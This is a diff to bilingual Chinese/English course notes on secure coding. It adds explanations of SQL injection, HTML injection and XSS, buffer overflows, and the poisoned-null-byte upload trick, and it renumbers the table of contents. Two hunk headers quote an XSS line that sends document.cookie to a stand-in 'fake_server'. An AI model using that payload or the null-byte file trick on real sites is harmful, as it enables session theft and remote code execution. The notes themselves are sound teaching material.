@@ -28,14 +28,15 @@
 * [===========](#-2)
 * [缓冲区溢出攻击：Programming Language Problems](#缓冲区溢出攻击programming-language-problems)
 * [缓冲区溢出例子：Unix Password Checking](#缓冲区溢出例子unix-password-checking)
+* [===========](#-3)
 * [C/C++空字节： Poisoned null byte](#cc空字节-poisoned-null-byte)
 * [客户端也不安全：Client-Side Secuirty Doesn't Exist](#客户端也不安全client-side-secuirty-doesnt-exist)
-* [===========](#-3)
+* [===========](#-4)
 * [避免使用过期会话ID:Avoid Stale Session ID](#避免使用过期会话idavoid-stale-session-id)
 * [不要提供过于丰富的错误信息：Do not provide helpful error messages](#不要提供过于丰富的错误信息do-not-provide-helpful-error-messages)
 * [注入-元字符：Meta Characters](#注入-元字符meta-characters)
 * [Never massage data](#never-massage-data)
-* [===========](#-4)
+* [===========](#-5)
 
 # 子系统数据传递：Passing Data to Subsystem
 
@@ -54,9 +55,13 @@
 
 # 问题-SQL注入：SQL Injection Problems
 
+SQL注入涉及在数据中引入元字符以改变操作的上下文。•	SQL injection involves the introduction of metacharacters in data to change the context of the operation.
+
 - 许多系统将**SQL查询传递给数据库子系统**。•	Many systems pass SQL queries to a database subsystem.
   - 这些查询通常是由**用户输入的**。•	The queries are often constructed from user input.
 - **这些查询将包含元字符，可以被攻击者滥用**。•	These queries will contain meta-characters which can be misused by an attacker.
+  - 可以导致崩溃。•	Can cause crashes.
+  - 可以注入恶意代码。•	Can inject malicious code.
   - 例如，'将从命令模式切换到输入模式，反之亦然。•	For example, ‘ will switch form command mode to input mode and vice versa.
   - 用户可以在他们的输入中加入'，让SQL切换到命令模式。•	A user can put ‘ in their input, getting SQL to switch to command mode.
   - 这就允许将命令注入到SQL系统中。•	This allows injection of a command into the SQL system.
@@ -210,6 +215,7 @@ boiler template复用
   - 因此，**在静态分析中所坚持的政策提供了一个关于在哪里进行这些检查的指示**。•	Therefore the policy that is being upheld in static analysis provides an indication on where to perform these checks.
 - 我们应该**如何处理这个问题，主要取决于我们想解决哪些可能的问题**。•	How we should handle the problem, largely depends on what possible problems we want to address.
 - 在**讨论SQL注入时，有各种攻击载体**。•	There are various attack vectors when discussing SQL injection.
+- 都试图绕开安全机制，所以知道代码层面，不可信数据在哪里与可信数据相会，我们就能提出sanitizers来缓解，或者至少知道问题存在并进行报告
 
 # ===========
 
@@ -226,6 +232,10 @@ boiler template复用
 
 # HTML注入：HTML Injection
 
+HTML注入涉及通过提供的机制将脚本引入HTML，以操纵渲染的HTML。•	HTML injection involves introducing scripts into HTML through mechanisms provided to manipulate rendered HTML.【很难控制其他人在系统上做什么
+
+- 常常被用来提供重定向到恶意网站（js。•	Often used to provide redirects to malicious sites.
+- 也可用于劫持会话(XSS。•	Can also be used to hijack sessions.
 - 有时，**用户输入被用来创建一个HTML文件，然后被执行**。•	Sometimes user input is used to create a HTML file that is then executed.
 - 如果用户输入的是`<script>something</script>`，那么我们就**注入了一个命令**。•	If the user input is `<script>something</script>` then we have injected a command.
 - **这是一种跨网站脚本的形式**。•	This is a form of cross site scripting.
@@ -304,6 +314,14 @@ document.location.replace("fake_server "+"? what="+document.cookie)
 
 # 缓冲区溢出攻击：Programming Language Problems
 
+缓冲区溢出攻击涉及到**向不应该被你的程序触及的内存区域写东西**。•	Buffer overflow attacks involves writing to areas of memory that should not be touched by your program.
+
+- 攻击者可以注入恶意代码，并在缓冲区内提供对恶意有效载荷的回调。•	Attackers can inject malicious code and provide a callback to the malicious payload within the buffer.
+- 回调通常在堆栈中被覆盖，地址指向恶意的有效载荷。•	The callback is often overridden on the stack with an address pointing to the malicious payload.
+- **这些攻击正变得越来越少，因为大多数现代内存控制器实现了地址随机化以防止这种情况**。•	These attacks are becoming more scarce, as most modern memory controllers implement address randomization to prevent this.
+  - example: randomization of virtual memory address space
+  - 而缓冲区溢出依赖于静态内存空间，因为攻击者知道恶意代码注入位置，如果是动态的就很难实现
+  - 旧linux系统上的root用户破解是一个例子（见后面
 - **C和C++不会自动检查我们是否超过数组边界**。•	C and C++ do not automatically check to see if we exceed an array bound.
   - 高级语言如Java，python会做边界检查
   - 如果数组边界检查很重要，就必须由程序员来做。•	If array bound checking is important it must be done by the programmer.
@@ -322,7 +340,13 @@ document.location.replace("fake_server "+"? what="+document.cookie)
 ![](/static/2022-04-22-20-23-09.png)
 ![](/static/2022-04-22-20-25-15.png)
 
+# ===========
+
 # C/C++空字节： Poisoned null byte
+
+通过利用这种数据的解释方式，空字节可以被用来攻击系统。•	Null bytes can be used to attack systems by exploiting how such data is interpreted.
+
+* <font color="red">编程语言及其数据表示法之间缺乏标准化是问题的主要根源。还有攻击者的恶意动机</font>•	The lack of standardization between programming languages and their representation of data is the main root of the problem.malicious intent of people.
 
 C和C++使用一个空字节（'\0'）来结束一个字符串。•	C and C++ use a null byte (’\0’) to terminate a string.
 
@@ -342,7 +366,9 @@ C和C++使用一个空字节（'\0'）来结束一个字符串。•	C and C++ u
   - Visual Basic将接受这个文件**作为一个图像文件**，并可以发送到服务器上。•	Visual Basic will accept this as an image file and can be sent to a server.
   - **服务器会将其视为一个.php的C文件**,crack.php,并执行它。•	The server will see this as a .php C file crack.php and execute it.
     - 因为`\0`，，不会读到实际的扩展名`.jpg`，，然后会执行php脚本
-    - 由缺少文件表示的标准性造成
+    - <font color="red">编程语言及其数据表示法之间缺乏标准化是问题的主要根源。还有攻击者的恶意动机</font>•	The lack of standardization between programming languages and their representation of data is the main root of the problem.malicious intent of people.
+  - 这可以被用来绕过**脚本的静态分析检查**。•	This can be used to bypass static analysis checks on scripts.
+    - 因为静态分析器只检查suffix，，确认是`.jpg`就通过执行。所以检查内容也很重要，因为jpg里面不会有Php code
 
 # 客户端也不安全：Client-Side Secuirty Doesn't Exist
 
